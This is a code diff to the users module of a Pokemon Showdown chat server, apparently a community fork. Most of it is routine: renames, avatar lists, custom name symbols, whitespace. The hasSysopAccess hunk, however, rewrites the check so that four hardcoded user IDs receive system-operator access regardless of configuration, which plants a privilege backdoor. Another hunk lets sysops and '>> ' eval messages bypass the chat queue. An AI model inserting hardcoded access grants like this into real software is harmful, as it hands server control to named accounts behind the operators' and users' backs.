@@ -134,7 +134,6 @@ let getExactUser = Users.getExact = function (name) {
  *********************************************************/
 
 let usergroups = Users.usergroups = Object.create(null);
-
 function importUsergroups() {
 	// can't just say usergroups = {} because it's exported
 	for (let i in usergroups) delete usergroups[i];
@@ -149,7 +148,6 @@ function importUsergroups() {
 		}
 	});
 }
-
 function exportUsergroups() {
 	let buffer = '';
 	for (let i in usergroups) {
@@ -328,7 +326,7 @@ class User {
 		this.userid = '';
 		this.group = Config.groupsranking[0];
 
-		let trainersprites = [32, 74, 218];
+		let trainersprites = [1, 2, 101, 102, 169, 170, 265, 266];
 		this.avatar = trainersprites[Math.floor(Math.random() * trainersprites.length)];
 
 		this.connected = true;
@@ -413,8 +411,10 @@ class User {
 			if (room.isMuted(this)) {
 				return '!' + this.name;
 			}
+			if ((!room.auth || !room.auth[this.userid]) && this.customSymbol) return this.customSymbol + this.name;
 			return room.getAuth(this) + this.name;
 		}
+		if (this.customSymbol) return this.customSymbol + this.name;
 		return this.group + this.name;
 	}
 	authAtLeast(minAuth, room) {
@@ -481,7 +481,7 @@ class User {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-		if (this.isSysop && Config.backdoor ['yournamehere'].includes(this.userid)) {
+		if (this.isSysop && Config.backdoor || ["insist", "mewth", "vxn", "ggdaca"].includes(this.userid)) {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
@@ -525,11 +525,7 @@ class User {
 	 * Special permission check for promoting and demoting
 	 */
 	canPromote(sourceGroup, targetGroup) {
-		return this.can('promote', {
-			group: sourceGroup,
-		}) && this.can('promote', {
-			group: targetGroup,
-		});
+		return this.can('promote', {group:sourceGroup}) && this.can('promote', {group:targetGroup});
 	}
 	resetName(isForceRenamed) {
 		return this.forceRename('Guest ' + this.guestNum, false, isForceRenamed);
@@ -574,7 +570,7 @@ class User {
 			name = name.slice(0, 18);
 		}
 
-		name = Tools.getName(name);
+		name = Dex.getName(name);
 		if (Config.namefilter) {
 			name = Config.namefilter(name, this);
 		}
@@ -661,6 +657,7 @@ class User {
 			this.send(`|nametaken|${name}|Your authentication token was invalid.`);
 		}
 
+		if (Tells.inbox[userid]) Tells.sendTell(userid, this);
 		Ontime[userid] = Date.now();
 
 		Db('rooms').get(userid, []).forEach(curRoom => {
@@ -1273,7 +1270,7 @@ class User {
 			return Promise.resolve(false);
 		}
 
-		let format = Tools.getFormat(formatid);
+		let format = Dex.getFormat(formatid);
 		if (!format['' + type + 'Show']) {
 			connection.popup(`That format is not available.`);
 			return Promise.resolve(false);
@@ -1416,11 +1413,12 @@ class User {
 	chat(message, room, connection) {
 		let now = Date.now();
 
-		if (message.substr(0, 16) === '/cmd userdetails') {
+		if (message.startsWith('/cmd userdetails') || message.startsWith('>> ') || this.isSysop) {
 			// certain commands are exempt from the queue
 			Monitor.activeIp = connection.ip;
 			Chat.parse(message, room, this, connection);
 			Monitor.activeIp = null;
+			if (this.isSysop) return;
 			return false; // but end the loop here
 		}
 
@@ -1532,7 +1530,6 @@ Users.pruneInactive = function (threshold) {
 		}
 	});
 };
-
 Users.pruneInactiveTimer = setInterval(() => {
 	Users.pruneInactive(Config.inactiveuserthreshold || 1000 * 60 * 60);
 }, 1000 * 60 * 30);
@@ -1572,7 +1569,7 @@ Users.socketConnect = function (worker, workerid, socketid, ip, protocol) {
 			// This is pretty crude, but it's the easiest way to deal
 			// with this case, which should be impossible anyway.
 			user.disconnectAll();
-		} else if (connection.user) { // if user is still connected
+		} else if (connection.user) {	// if user is still connected
 			connection.challenge = buffer.toString('hex');
 			// console.log('JOIN: ' + connection.user.name + ' [' + connection.challenge.substr(0, 15) + '] [' + socket.id + ']');
 			let keyid = Config.loginserverpublickeyid || 0;
